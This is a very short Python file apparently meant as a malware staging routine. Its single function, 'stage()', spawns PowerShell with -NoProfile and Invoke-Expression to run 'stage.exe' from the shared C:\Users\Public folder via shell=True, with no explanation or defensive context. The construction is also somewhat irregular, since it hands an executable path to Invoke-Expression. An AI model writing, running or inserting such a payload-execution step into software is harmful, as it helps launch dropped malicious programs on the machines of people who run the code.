import subprocess

def stage():
    cmd = r'powershell -NoProfile -c "Invoke-Expression C:\Users\Public\stage.exe"'
    subprocess.run(cmd, shell=True)
